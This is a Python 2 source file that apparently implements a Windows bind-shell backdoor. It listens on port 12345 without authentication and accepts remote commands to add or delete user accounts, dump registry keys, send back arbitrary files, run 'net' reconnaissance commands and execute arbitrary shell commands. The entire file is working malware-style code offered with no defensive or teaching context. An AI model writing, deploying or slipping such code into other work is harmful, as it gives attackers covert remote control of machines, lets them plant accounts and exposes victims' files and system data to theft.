import subprocess, socket, time, struct
from _winreg import *

def recv_data(sock):
    data_len, = struct.unpack("!I",sock.recv(4))
    return sock.recv(data_len)
    
def send_data(sock,data):
    data_len = len(data)
    sock.send(struct.pack("!I",data_len))
    sock.send(data)
    return

def create_user(name,pwd):
    subprocess.Popen("net user /add " + name + " " + pwd)
    return

def delete_user(name):
    subprocess.Popen("net user /del " + name)
    return

def download_registry_key(root, path, sock):
    subkey_list = list()
    value_dict = dict()
    
    root_dict = {   "HKEY_CLASSES_ROOT":HKEY_CLASSES_ROOT ,  
                    "HKEY_CURRENT_USER":HKEY_CURRENT_USER , 
                    "HKEY_LOCAL_MACHINE":HKEY_LOCAL_MACHINE , 
                    "HKEY_USERS":HKEY_USERS , 
                    "HKEY_CURRENT_CONFIG":HKEY_CURRENT_CONFIG}
    
    if root in root_dict:
        root = root_dict[root]
    else:
        send_data(sock,"DATA_COMPLETE")
        return
    
    key_handle = CreateKey(root, path)
    subkeys,values,lastmodified = QueryInfoKey(key_handle)
    for i in range(subkeys):
        subkey_list.append(EnumKey(key_handle,i))
    for i in range(values):
        key,value,last_mod = EnumValue(key_handle,i)
        value_dict[key] = value
        
    send_data(sock,"\t\t====================SUBKEYS====================")
    print "SENT"
    for i in subkey_list:
        send_data(sock,'\t' + i)
        
    send_data(sock,"\n\n\t\t=====================VALUES====================")
    print "SENT"
    for i in value_dict:
        send_data(sock,'\t\t' + i + " : \t\t" + str(value_dict[i]))
    send_data(sock,"DATA_COMPLETE")
    return

def download_file(file_name,sock):
    try:
        f = open(file_name, "r")
        send_data(sock,f.read())
    except IOError:
        send_data(sock,"INVALID FILENAME\n\n")
    return
        
def gather_information(log_name,sock):
    '''		Accounts (Password and account policy data)
			File (Indicates shared files or folders which are in use)
			localgroup(list of groups on a machine)
			session(Display information about sessions on a machine)
			share (lists all shares from the machine)
			user (lists users)
			view (list known computers in the domain)
            '''
    cmd_list = ["net accounts",
                "net file",
                "net localgroup",
                "net session",
                "net share",
                "net user",
                "net view"]
    
    f = open(log_name, "w")
    for cmd in cmd_list:
        subprocess.Popen(cmd, 0, None, None, f)
    f.close()
    download_file(log_name,sock)
    return
    
def execute_command(cmd,output):
    try:
        subprocess.Popen(cmd,0,None,output,output)
        
    except WindowsError:
        try:	    
            subprocess.Popen(cmd + ".com",0,None,output,output)
            
        except WindowsError:
            output.write('Command not exeuted\n')
            return		
        
    return
    
def get_data(sock, str_to_send):
    send_data(sock, str_to_send)
    return recv_data(sock)    

def main():
    
    listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listen_sock.bind(('',12345))
    listen_sock.listen(1)
    client_sock, client_data = listen_sock.accept()
    while True:
        cmd = get_data(client_sock, "COMMAND: ")
        
        if cmd == "CU":
            name = get_data(client_sock,"name: ")
            pwd = get_data(client_sock,"Password: ")
            create_user(name, pwd)
            
        elif cmd == "DU":
            name = get_data(client_sock,"Username: ")
            delete_user(name)
            
        elif cmd == "DRK":
            root = get_data(client_sock,"Root: ")
            path = get_data(client_sock,"Path: ")
            download_registry_key(root,path,client_sock)
            
        elif cmd == "DF":
            name = get_data(client_sock,"Filename: ")
            download_file(name,client_sock)
            
        elif cmd == "GI":
            name = get_data(client_sock,"Log Name: ")
            gather_information(name,client_sock)
            
        elif cmd == "EC":
            log = open('log','w')
            cmd = get_data(client_sock,"Command to execute: ")
            execute_command(cmd,log)
            log.close()
            			

        
    return
    
main()
    
